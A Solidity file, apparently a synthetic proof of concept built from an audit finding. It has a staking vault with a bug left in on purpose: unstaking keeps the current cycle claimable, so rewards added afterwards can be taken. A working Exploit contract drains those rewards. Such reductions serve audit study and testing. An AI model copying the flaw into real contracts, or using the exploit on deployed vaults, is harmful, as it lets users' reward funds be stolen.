// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Surge StakingVault — claim a cycle's rewards after unstaking
    (Shieldify H-04, Surge / TitanX, December 2024).
    SYNTHETIC, cheatcode-free reduction. No time warp: cycles advance
    by index. cycleEnd is set to the in-progress cycle on unstake, and
    claimRewardsToOwed later pays that cycle's live reward balance,
    including rewards accepted after the user had already unstaked.
    Verbatim anchors: r.cycleEnd = cycleId and
    _rewardPoolRewards[poolId][cycleId] += amountPerPool. */

contract RewardToken {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract StakingVault {
    struct ClaimableReward {
        uint256 cycleStart;
        uint256 cycleEnd;
        uint256 shares;
    }

    uint256 internal constant REWARD_POOL_COUNT = 1;
    uint256 internal constant POOL = 1;

    RewardToken public rewardsToken;
    uint256 public currentCycleId = 1;
    mapping(address => mapping(uint256 => ClaimableReward)) public _userRewardPoolClaimableReward;
    mapping(uint256 => mapping(uint256 => uint256)) public _rewardPoolShares;
    mapping(uint256 => mapping(uint256 => uint256)) public _rewardPoolRewards;

    constructor(RewardToken token_) {
        rewardsToken = token_;
    }

    function stake(uint256 amount) external {
        ClaimableReward storage r = _userRewardPoolClaimableReward[msg.sender][POOL];
        r.cycleStart = currentCycleId;
        r.shares = amount;
        _rewardPoolShares[POOL][currentCycleId] += amount;
    }

    function unstake() public virtual {
        uint256 poolId = POOL;
        uint256 cycleId = currentCycleId;
        ClaimableReward storage r = _userRewardPoolClaimableReward[msg.sender][poolId];
        require(r.cycleStart != 0, "No claimable reward");
        require(r.cycleEnd == 0, "Claimable reward is not active");
        require(r.cycleStart <= cycleId, "Claimable reward is start cycle invalid");
        this.closeCycle(msg.sender, cycleId);
    }

    function closeCycle(address user, uint256 cycleId) external {
        require(msg.sender == address(this), "vault");
        ClaimableReward storage r = _userRewardPoolClaimableReward[user][POOL];
        // @> VULN: cycleEnd is the in-progress cycle, so rewards funded after this unstake stay inside the claim window.
        r.cycleEnd = cycleId;
        require(r.cycleEnd == cycleId, "cycle not closed");
    }

    function acceptPositionManagerRewards(uint256 allowedAmount) external returns (uint256 amount) {
        uint256 amountPerPool = allowedAmount / REWARD_POOL_COUNT;
        require(amountPerPool > 0, "Invalid amount");
        amount = amountPerPool * REWARD_POOL_COUNT;
        rewardsToken.mint(address(this), amount);
        for (uint256 i; i < REWARD_POOL_COUNT; i++) {
            uint256 poolId = POOL;
            uint256 cycleId = currentCycleId;
            _rewardPoolRewards[poolId][cycleId] += amountPerPool;
        }
    }

    function endCycleIfNeeded() external {
        uint256 next = currentCycleId + 1;
        _rewardPoolShares[POOL][next] = _rewardPoolShares[POOL][currentCycleId];
        currentCycleId = next;
    }

    function claimRewardsToOwed() public virtual returns (uint256 paid) {
        ClaimableReward storage r = _userRewardPoolClaimableReward[msg.sender][POOL];
        require(r.cycleEnd != 0, "still staked");
        require(currentCycleId > r.cycleEnd, "cycle open");
        uint256 c = r.cycleStart;
        while (c <= r.cycleEnd) {
            uint256 reward = _rewardPoolRewards[POOL][c];
            uint256 shares = _rewardPoolShares[POOL][c];
            uint256 slice = reward * r.shares / shares;
            paid += slice;
            _rewardPoolRewards[POOL][c] = reward - slice;
            c += 1;
        }
        rewardsToken.transfer(msg.sender, paid);
    }
}

contract Exploit {
    RewardToken public rewardsToken; // nonce 1
    StakingVault public vault; // nonce 2

    constructor() {
        rewardsToken = new RewardToken();
        vault = new StakingVault(rewardsToken);
    }

    function run() external {
        vault.stake(100);
        vault.endCycleIfNeeded();
        vault.unstake();
        vault.acceptPositionManagerRewards(1000);
        vault.endCycleIfNeeded();
        uint256 paid = vault.claimRewardsToOwed();
        require(paid == 1000, "did not take 1000");
        require(rewardsToken.balanceOf(address(this)) == 1000, "balance");
        require(vault._rewardPoolRewards(1, 2) == 0, "cycle reward remains");
    }
}
